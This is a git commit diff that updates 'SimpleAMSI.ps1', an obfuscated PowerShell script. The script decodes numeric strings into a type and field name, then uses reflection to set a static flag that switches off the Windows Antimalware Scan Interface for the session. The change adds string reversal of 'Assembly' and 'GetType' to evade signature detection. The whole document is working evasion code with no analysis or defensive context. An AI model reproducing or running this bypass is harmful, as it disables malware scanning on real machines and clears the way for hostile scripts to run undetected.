2cc14f33c9f857a544135193e16977143a6e1687
Rob <61951374+Leo4j@users.noreply.github.com>
2025-10-01 12:03:27 +0100

    Update SimpleAMSI.ps1

--- SimpleAMSI.ps1
+++ SimpleAMSI.ps1
@@ -1,7 +1,9 @@
-$A="5492868772801748688168747280728187173688878280688776828" 
-$B="1173680867656877679866880867644817687416876797271" 
-[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B). 
-substring(($_*2),2))})-replace " " ). 
-GetField([string](38..51|%{[char][int](29+($A+$B). 
-substring(($_*2),2))})-replace " ",'NonPublic,Static'). 
+$A="5492868772801748688168747280728187173688878280688776828"
+$B="1173680867656877679866880867644817687416876797271"
+$C="ylbmessA".ToCharArray()[-1..-("ylbmessA".Length)] -join ''
+$D="epytteg".ToCharArray()[-1..-("epytteg".Length)] -join ''
+[Ref]."$C"."$D"([string](0..37|%{[char][int](29+($A+$B).
+substring(($_*2),2))})-replace " " ).
+GetField([string](38..51|%{[char][int](29+($A+$B).
+substring(($_*2),2))})-replace " ",'NonPublic,Static').
 SetValue($null,$true)
